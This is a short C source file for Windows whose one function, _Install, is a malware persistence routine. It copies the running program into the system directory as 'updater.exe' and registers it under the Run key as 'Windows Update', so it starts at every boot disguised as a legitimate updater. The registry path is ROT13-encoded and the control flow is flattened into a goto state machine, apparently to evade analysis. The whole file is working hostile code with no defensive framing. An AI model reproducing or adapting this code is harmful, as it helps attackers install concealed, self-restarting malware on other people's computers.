#include "data_globals.h"
#include <windows.h>
#include <string.h>

#pragma optimize("", off)
uint32_t _Install(void)
{
    char ModPath[256];
    char SPath[256];
    char TranGU[110];
    DWORD cbData;
    HKEY hKey;
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    GetModuleFileNameA(NULL, ModPath, sizeof(ModPath));
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    GetSystemDirectoryA(SPath, sizeof(SPath));
    strcat(SPath, "\\updater.exe");
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_3:
    CopyFileA(ModPath, SPath, FALSE);
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_4:
    memset(TranGU, 0, sizeof(TranGU));
    _CiphStr(TranGU, "FBSGJNER\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha");
    dummy_state = 5;
    goto dummy_dispatcher;

dummy_state_5:
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, TranGU, 0, KEY_WRITE, &hKey);
    cbData = strlen(SPath);
    RegSetValueExA(hKey, "Windows Update", 0, REG_SZ, SPath, cbData);
    RegCloseKey(hKey);
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return 0;
}
#pragma optimize("", on)
